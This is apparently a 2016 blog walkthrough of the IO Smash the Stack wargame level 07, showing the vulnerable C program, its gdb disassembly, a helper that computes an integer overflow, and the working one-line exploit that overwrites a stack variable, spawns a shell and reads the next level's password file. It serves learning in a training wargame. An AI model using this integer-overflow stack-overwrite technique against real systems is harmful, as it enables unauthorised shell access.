+++
title = "IO Smash the stack level 07"
date = "2016-01-28T21:54:00-02:00"
publishdate = "2016-01-28"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-07"
project_url = "https://greyhat.dk/io-smashthestack-level-07"
type = "post"
description = "Walk-through"
image = "binary.png"
image_alt = "Binary pattern"
+++

## Level07

level7@io:/levels$ cat level07.c
```c
//written by bla
#include <stdio.h>
#include <string.h>
#include <unistd.h>



int main(int argc, char **argv)
{

        int count = atoi(argv[1]);
        int buf[10];

        if(count >= 10 )
                return 1;


        memcpy(buf, argv[2], count * sizeof(int));

        if(count == 0x574f4c46) {
		printf("WIN!\n");
                execl("/bin/sh", "sh" ,NULL);
	} else
                printf("Not today son\n");


        return 0;
}
```

Oki so count has to be 10 or less to invoke the memcpy but in order to get a shell count has to be 0x574f4c46 (1464814662). So we need to overflow the stack to overwrite count but since we can only specify a negative number we need to make an integer overflow.


```sh
level7@io:/levels$ gdb -q ./level07
Reading symbols from /levels/level07...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048414 <+0>:	push   %ebp
   0x08048415 <+1>:	mov    %esp,%ebp
   0x08048417 <+3>:	sub    $0x68,%esp
   0x0804841a <+6>:	and    $0xfffffff0,%esp
   0x0804841d <+9>:	mov    $0x0,%eax
   0x08048422 <+14>:	sub    %eax,%esp
   0x08048424 <+16>:	mov    0xc(%ebp),%eax
   0x08048427 <+19>:	add    $0x4,%eax
   0x0804842a <+22>:	mov    (%eax),%eax
   0x0804842c <+24>:	mov    %eax,(%esp)
   0x0804842f <+27>:	call   0x8048354 <atoi@plt>
   0x08048434 <+32>:	mov    %eax,-0xc(%ebp)
   0x08048437 <+35>:	cmpl   $0x9,-0xc(%ebp)
   0x0804843b <+39>:	jle    0x8048446 <main+50>
   0x0804843d <+41>:	movl   $0x1,-0x4c(%ebp)
   0x08048444 <+48>:	jmp    0x80484ad <main+153>
   0x08048446 <+50>:	mov    -0xc(%ebp),%eax
   0x08048449 <+53>:	shl    $0x2,%eax
   0x0804844c <+56>:	mov    %eax,0x8(%esp)
   0x08048450 <+60>:	mov    0xc(%ebp),%eax
   0x08048453 <+63>:	add    $0x8,%eax
   0x08048456 <+66>:	mov    (%eax),%eax
   0x08048458 <+68>:	mov    %eax,0x4(%esp)
   0x0804845c <+72>:	lea    -0x48(%ebp),%eax    <--- load buf
   0x0804845f <+75>:	mov    %eax,(%esp)
   0x08048462 <+78>:	call   0x8048334 <memcpy@plt>
   0x08048467 <+83>:	cmpl   $0x574f4c46,-0xc(%ebp)
   0x0804846e <+90>:	jne    0x804849a <main+134>
   0x08048470 <+92>:	movl   $0x8048584,(%esp)
   0x08048477 <+99>:	call   0x8048344 <printf@plt>
   0x0804847c <+104>:	movl   $0x0,0x8(%esp)
   0x08048484 <+112>:	movl   $0x804858a,0x4(%esp)
   0x0804848c <+120>:	movl   $0x804858d,(%esp)
   0x08048493 <+127>:	call   0x8048324 <execl@plt>
   0x08048498 <+132>:	jmp    0x80484a6 <main+146>
   0x0804849a <+134>:	movl   $0x8048595,(%esp)
   0x080484a1 <+141>:	call   0x8048344 <printf@plt>
   0x080484a6 <+146>:	movl   $0x0,-0x4c(%ebp)
   0x080484ad <+153>:	mov    -0x4c(%ebp),%eax
   0x080484b0 <+156>:	leave
   0x080484b1 <+157>:	ret
End of assembler dump.
(gdb) !echo "ibase=16;48"|bc
72
```

Ok we need to find an integer overflow that gives us a buffer of 72 or more. For this I wrote a small test in C. Remember that

Maximum int 2^32

Minimum int -2^31

and I assume that the size of int is 4 bytes

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
 int a = atoi(argv[1]);

 printf("%d and len %d\n", a, a*sizeof(int));

 return 0;
}
```

```sh
kgn@kali:~$ ./intoverflow $(echo "(-2^31)+(72/4)"|bc)
-2147483630 and len 72
```

Back to GDB

```sh
(gdb) r $(echo "(-2^31)+(72/4)"|bc) $(python -c 'print "\x46\x4c\x4f\x57" * (72/4)')
Starting program: /levels/level07 $(echo "(-2^31)+(72/4)"|bc) $(python -c 'print "\x46\x4c\x4f\x57" * (72/4)')
WIN!
process 1800 is executing new program: /bin/bash
sh-4.2$
```

Outside GDB

```sh
level7@io:/levels$ ./level07 $(echo "(-2^31)+(72/4)"|bc) $(python -c 'print "\x46\x4c\x4f\x57" * (72/4)')
WIN!
sh-4.2$ cat /home/level8/.pass
XXXXXXXXXXXXXXXX
```
